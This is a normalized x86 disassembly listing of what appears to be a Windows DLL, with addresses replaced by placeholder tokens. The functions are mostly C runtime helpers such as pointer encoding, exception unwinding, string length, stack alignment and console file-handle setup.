retn
sub_10005dc6
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10005cd0
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_10005ddb
push esi
xor esi esi
push [ esi + rw-data ]
call [ EncodePointer@IAT ]
mov [ esi + rw-data ] eax
add esi 0x4
cmp esi 0x28
jb r-xdata
pop esi
retn
sub_10005dfa
push 0x8
push r--data
call sub_10004750
call sub_10003390
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_100071bb
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_10005e1a
xor eax eax
inc eax
retn
sub_10005e1e
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100071bb
sub_10005e2e
push sub_10005dfa
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_10005e3f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10005e4c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10005e59
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_10005e66
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_10005ffd
test ebx ebx
je r-xdata
retn
push 0x0
call sub_10004ab1
pop ecx
sub_10006156
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_10006080
add esp 0xc
pop ebp
retn 0x4
sub_10006189
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_10007ca5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_100061bb
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_10006080
add esp 0xc
pop ebp
retn 0x8
sub_10006245
call sub_10007a96
cmp [ rw-data ] 0x0
je r-xdata
push [ rw-data ]
call sub_10003622
and [ rw-data ] 0x0
pop ecx
retn
call sub_10007cc7
sub_10006398
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_10006342
add esp 0x10
pop ebp
retn
sub_10006e88
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_100071b2
push 0x2
call sub_1000392b
sub_10007a96
push 0x1
call sub_10007a9f
pop ecx
retn
sub_10007b47
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_10006315
pop ecx
pop ecx
retn
sub_10007b7a
push 0x1
call sub_10004ab1
pop ecx
retn
sub_10007c79
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_10007bb0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_10007cc4
call eax
retn
sub_10007d5b
push 0x1
call sub_10004ab1
pop ecx
retn
sub_10007dad
push 0xc
call sub_10004ab1
pop ecx
retn
sub_10007dc0
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10008b60
sub_10007dd6
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10008b60
sub_1000814a
push edi
call sub_10008d04
pop ecx
retn
sub_10008224
push esi
call sub_10008d04
pop ecx
retn
sub_10008b52
push esi
call sub_100062db
pop ecx
retn
sub_10008c0e
push 0xa
call sub_10004ab1
pop ecx
retn
sub_10008d60
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10008d2a
pop ecx
pop ecx
pop ebp
retn
sub_10008ed5
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10008de2
add esp 0x10
pop ebp
retn
sub_10008fcf
push esi
call sub_10008d04
pop ecx
retn
sub_10009104
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
retn
cmp eax 0xfffffffe
je r-xdata
push eax
call [ CloseHandle@IAT ]
sub_1000911b
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileW@IAT ]
mov [ rw-data ] eax
retn
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_10009198
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10002de0
jmp sub_10004795
